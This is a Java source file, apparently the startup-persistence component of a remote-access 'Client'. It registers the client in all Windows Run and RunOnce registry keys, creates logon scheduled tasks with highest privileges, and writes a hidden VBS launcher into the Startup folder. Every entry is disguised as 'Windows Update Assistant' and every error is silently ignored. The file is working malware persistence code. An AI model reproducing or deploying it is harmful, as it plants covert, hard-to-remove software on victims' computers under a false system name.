import java.io.File;

public class StartupManager {

    private static final String REG_KEY = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    private static final String REG_NAME = "Windows Update Assistant";

    private static final String[] REG_LOCATIONS = new String[]{
        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
        "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
    };

    public static void register() {
        try {
            String jarPath = new File(Client.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
            String command;

            if (jarPath.endsWith(".jar")) {
                command = "javaw -jar \"" + jarPath + "\"";
            } else {
                String classDir = new File(jarPath).getParent();
                if (classDir == null) classDir = jarPath;
                command = "javaw -cp \"" + classDir + "\" Client";
            }

            for (String regKey : REG_LOCATIONS) {
                try {
                    Runtime.getRuntime().exec(new String[]{
                        "reg", "add", regKey,
                        "/v", REG_NAME,
                        "/t", "REG_SZ",
                        "/d", command,
                        "/f"
                    });
                } catch (Exception ignored) {}
            }

            try {
                Runtime.getRuntime().exec(new String[]{
                    "schtasks", "/create",
                    "/tn", REG_NAME,
                    "/tr", command,
                    "/sc", "ONLOGON",
                    "/f",
                    "/rl", "HIGHEST"
                });
            } catch (Exception ignored) {}

            try {
                Runtime.getRuntime().exec(new String[]{
                    "schtasks", "/create",
                    "/tn", REG_NAME,
                    "/tr", command,
                    "/sc", "ONLOGON",
                    "/f"
                });
            } catch (Exception ignored) {}

            try {
                String appData = System.getenv("APPDATA");
                if (appData != null) {
                    File startupDir = new File(appData, "Microsoft\\Windows\\Start Menu\\Programs\\Startup");
                    if (startupDir.exists()) {
                        String cleanName = REG_NAME.replaceAll("[^a-zA-Z0-9]", "");
                        if (cleanName.isEmpty()) cleanName = "ClientStartup";
                        File vbsFile = new File(startupDir, cleanName + ".vbs");
                        String vbsContent = "CreateObject(\"Wscript.Shell\").Run \"" + command.replace("\"", "\"\"") + "\", 0, False";
                        java.nio.file.Files.write(vbsFile.toPath(), vbsContent.getBytes("UTF-8"));
                    }
                }
            } catch (Exception ignored) {}

        } catch (Exception ignored) {}
    }

    public static void remove() {
        for (String regKey : REG_LOCATIONS) {
            try {
                Process p = Runtime.getRuntime().exec(new String[]{
                    "reg", "delete", regKey,
                    "/v", REG_NAME,
                    "/f"
                });
                p.waitFor();
            } catch (Exception ignored) {}
        }
        try {
            Process p = Runtime.getRuntime().exec(new String[]{
                "schtasks", "/delete",
                "/tn", REG_NAME,
                "/f"
            });
            p.waitFor();
        } catch (Exception ignored) {}
        try {
            String appData = System.getenv("APPDATA");
            if (appData != null) {
                String cleanName = REG_NAME.replaceAll("[^a-zA-Z0-9]", "");
                if (cleanName.isEmpty()) cleanName = "ClientStartup";
                File vbsFile = new File(appData, "Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + cleanName + ".vbs");
                if (vbsFile.exists()) {
                    vbsFile.delete();
                }
            }
        } catch (Exception ignored) {}
        try { Thread.sleep(500); } catch (Exception ignored) {}
    }
}